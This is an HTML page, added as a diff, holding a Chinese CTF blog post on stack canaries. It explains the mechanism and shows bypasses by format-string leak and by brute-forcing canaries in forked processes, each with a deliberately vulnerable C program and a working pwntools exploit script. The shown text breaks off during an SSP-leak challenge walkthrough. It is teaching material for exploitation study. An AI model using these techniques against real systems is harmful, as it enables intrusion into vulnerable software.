@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="此文讨论我目前所知的几种关于canary的玩法，我目前不知道的就等我以后什么时候知道了再补充吧。 先说说canarycanary直译就是金丝雀，为什么是叫金丝雀？ 17世纪，英国矿井工人发现，金丝雀对瓦斯这种气体十分敏感。空气中哪怕有极其微量的瓦斯，金丝雀也会停止歌唱；而当瓦斯含量超过一定限度时，虽然鲁钝的人类毫无察觉，金丝雀却早已毒发身亡。当时在采矿设备相对简陋的条件下，工人们每次下井都会带上一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="论canary的几种玩法">
+<meta property="og:url" content="https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/index.html">
+<meta property="og:site_name" content="veritas501&#39;s blog">
+<meta property="og:description" content="此文讨论我目前所知的几种关于canary的玩法，我目前不知道的就等我以后什么时候知道了再补充吧。 先说说canarycanary直译就是金丝雀，为什么是叫金丝雀？ 17世纪，英国矿井工人发现，金丝雀对瓦斯这种气体十分敏感。空气中哪怕有极其微量的瓦斯，金丝雀也会停止歌唱；而当瓦斯含量超过一定限度时，虽然鲁钝的人类毫无察觉，金丝雀却早已毒发身亡。当时在采矿设备相对简陋的条件下，工人们每次下井都会带上一">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_1122569b3258873874d61fd5bfc62fba.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_1d676e1ed18ade8675f112f61e39ab74.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_1acfdb1810a2876c78383f4a3a66a515.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_b151b13af2155fff6a842855cbbd4d07.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_0037817e6e24d51983d3575e02fc398d.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_7a0eddd01d532e95ac8a905e617c70b4.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_c0f71a7d08460009b1ff313dcdbf0294.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_a768142147ca3976598941b5c6c67161.png">
+<meta property="og:image" content="https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_b17d7868f95d135b35908e74805b7282.png">
+<meta property="article:published_time" content="2017-04-27T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-12-08T03:09:28.366Z">
+<meta property="article:author" content="veritas501">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="canary">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_1122569b3258873874d61fd5bfc62fba.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>论canary的几种玩法</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2017_04_28-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2017_04_23-32%E4%BD%8D%E4%B8%8B%E8%8A%B1%E6%A0%B7read_write/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&text=论canary的几种玩法"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&title=论canary的几种玩法"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&is_video=false&description=论canary的几种玩法"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=论canary的几种玩法&body=Check out this article: https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&title=论canary的几种玩法"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&title=论canary的几种玩法"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&title=论canary的几种玩法"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&title=论canary的几种玩法"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&name=论canary的几种玩法&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/&t=论canary的几种玩法"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%88%E8%AF%B4%E8%AF%B4canary"><span class="toc-number">1.</span> <span class="toc-text">先说说canary</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87canary-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="toc-number">2.</span> <span class="toc-text">绕过canary - 格式化字符串</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87canary-%E9%92%88%E5%AF%B9fork%E7%9A%84%E8%BF%9B%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">绕过canary - 针对fork的进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%85%E6%84%8F%E8%A7%A6%E5%8F%91canary-ssp-leak"><span class="toc-number">4.</span> <span class="toc-text">故意触发canary - ssp leak</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        论canary的几种玩法
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">veritas501</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2017-04-27T16:00:00.000Z" class="dt-published" itemprop="datePublished">2017-04-28</time>
+        
+        (Updated: <time datetime="2023-12-08T03:09:28.366Z" class="dt-updated" itemprop="dateModified">2023-12-08</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/CTF/" rel="tag">CTF</a>, <a class="p-category" href="/tags/PWN/" rel="tag">PWN</a>, <a class="p-category" href="/tags/canary/" rel="tag">canary</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>此文讨论我目前所知的几种关于canary的玩法，我目前不知道的就等我以后什么时候知道了再补充吧。</p>
+<h2 id="先说说canary"><a href="#先说说canary" class="headerlink" title="先说说canary"></a>先说说canary</h2><p>canary直译就是金丝雀，为什么是叫金丝雀？</p>
+<p>17世纪，英国矿井工人发现，金丝雀对瓦斯这种气体十分敏感。空气中哪怕有极其微量的瓦斯，金丝雀也会停止歌唱；而当瓦斯含量超过一定限度时，虽然鲁钝的人类毫无察觉，金丝雀却早已毒发身亡。当时在采矿设备相对简陋的条件下，工人们每次下井都会带上一只金丝雀作为“瓦斯检测指标”，以便在危险状况下紧急撤离。</p>
+<p>而程序里的canary就是来检测栈溢出的。</p>
+<p>检测的机制是这样的：</p>
+<p>1.程序从一个神奇的地方取出一个4（eax）或8（rax）节的值，在32位程序上，你可能会看到：</p>
+<p><img src="/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_1122569b3258873874d61fd5bfc62fba.png"></p>
+<p>在64位上，你可能会看到：</p>
+<p><img src="/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_1d676e1ed18ade8675f112f61e39ab74.png"></p>
+<p>总之，这个值你不能实现得到或预测，放到站上以后，eax中的副本也会被清空（xor eax,eax）</p>
+<p>2.程序正常的走完了流程，到函数执行完的时候，程序会再次从那个神奇的地方把canary的值取出来，和之前放在栈上的canary进行比较，如果因为栈溢出什么的原因覆盖到了canary而导致canary发生了变化则直接终止程序。</p>
+<p><img src="/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_1acfdb1810a2876c78383f4a3a66a515.png"></p>
+<p><img src="/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_b151b13af2155fff6a842855cbbd4d07.png"></p>
+<p>在栈中大致是这样一个画风：</p>
+<p><img src="/2017_04_28-%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/canary_0037817e6e24d51983d3575e02fc398d.png"></p>
+<h2 id="绕过canary-格式化字符串"><a href="#绕过canary-格式化字符串" class="headerlink" title="绕过canary - 格式化字符串"></a>绕过canary - 格式化字符串</h2><p>格式化字符串能够实现任意地址读写，具体的实现可以参考我blog中关于格式化字符串的总结，格式化字符串的细节不是本文讨论的重点。</p>
+<p>大体思路就是通过格式化字符串读取canary的值，然后在栈溢出的padding块把canary所在位置的值用正确的canary替换，从而绕过canary的检测。</p>
+<p>示例程序：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* compile cmd: gcc source.c -m32 -o bin</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getflag</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    FILE *fp = <span class="built_in">fopen</span>(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;get flag error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fgets</span>(flag, <span class="number">100</span>, fp);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stderr, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">read</span>(STDIN_FILENO, buffer, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">6</span>];</span><br><span class="line">	<span class="built_in">init</span>();</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%6s&quot;</span>,buffer);</span><br><span class="line">	<span class="built_in">printf</span>(buffer);</span><br><span class="line">	<span class="built_in">fun</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在第一次scanf的时候输入“%7$x”打印出canary，在fun中利用栈溢出控制eip跳转到getflag。</p>
+<p>poc:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./bin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">&#x27;%7$x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(cn.recv(),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"></span><br><span class="line">cn.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + p32(canary) + <span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + p32(<span class="number">0x0804863d</span>))</span><br><span class="line"></span><br><span class="line">flag = cn.recv()</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&#x27;flag is:&#x27;</span> + flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="绕过canary-针对fork的进程"><a href="#绕过canary-针对fork的进程" class="headerlink" title="绕过canary - 针对fork的进程"></a>绕过canary - 针对fork的进程</h2><p>对fork而言，作用相当于自我复制，每一次复制出来的程序，内存布局都是一样的，当然canary值也一样。那我们就可以逐位爆破，如果程序GG了就说明这一位不对，如果程序正常就可以接着跑下一位，直到跑出正确的canary。</p>
+<p>另外有一点就是canary的最低位是0x00，这么做为了防止canary的值泄漏。比如在canary上面是一个字符串，正常来说字符串后面有0截断，如果我们恶意写满字符串空间，而程序后面又把字符串打印出来了，那个由于没有0截断canary的值也被顺带打印出来了。设计canary的人正是考虑到了这一点，就让canary的最低位恒为零，这样就不存在上面截不截断的问题了。</p>
+<p>示例程序：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* compile cmd: gcc source.c -m32 -o bin</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">getflag</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">100</span>];</span><br><span class="line">    FILE *fp = <span class="built_in">fopen</span>(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;get flag error&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;   </span><br><span class="line">    <span class="built_in">fgets</span>(flag, <span class="number">100</span>, fp);</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">setbuf</span>(stdin, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">setbuf</span>(stderr, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">read</span>(STDIN_FILENO, buffer, <span class="number">120</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">	<span class="type">pid_t</span> pid;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		pid = fork();</span><br><span class="line">		<span class="keyword">if</span>(pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);</span><br><span class="line">			<span class="built_in">fun</span>();</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;recv sucess&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">wait</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>poc脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./bin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cn.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x100</span>):</span><br><span class="line">        cn.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + canary + <span class="built_in">chr</span>(i))</span><br><span class="line">        a = cn.recvuntil(<span class="string">&#x27;welcome\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;recv&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">            canary += <span class="built_in">chr</span>(i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">cn.sendline(<span class="string">&#x27;a&#x27;</span>*<span class="number">100</span> + canary + <span class="string">&#x27;a&#x27;</span>*<span class="number">12</span> + p32(<span class="number">0x0804864d</span>))</span><br><span class="line"></span><br><span class="line">flag = cn.recv()</span><br><span class="line">cn.close()</span><br><span class="line">log.success(<span class="string">&#x27;flag is:&#x27;</span> + flag)</span><br></pre></td></tr></table></figure>
+
+<h2 id="故意触发canary-ssp-leak"><a href="#故意触发canary-ssp-leak" class="headerlink" title="故意触发canary - ssp leak"></a>故意触发canary - ssp leak</h2><p>这题可以参考jarvis oj中 smashes一题的解题方法中的前一半。</p>
+<p>这里我偷个懒，直接把之前写的wp扔过来了，反正原理都在题里了。</p>
+<p>题目描述：</p>
+<blockquote>
+<p>Smashes, try your best to smash!!!</p>
+<p>nc pwn.jarvisoj.com 9877</p>
+<p><a target="_blank" rel="noopener" href="https://dn.jarvisoj.com/challengefiles/smashes.44838f6edd4408a53feb2e2bbfe5b229">smashes.44838f6edd4408a53feb2e2bbfe5b229</a></p>
+</blockquote>
+<p>首先查看保护</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ checksec pwn_smashes </span><br><span class="line">[*] <span class="string">&#x27;/home/veritas/pwn/jarvisoj/smashes/pwn_smashes&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
+
+<p>有canary，有nx</p>
+<p>ida找到关键函数：</p>
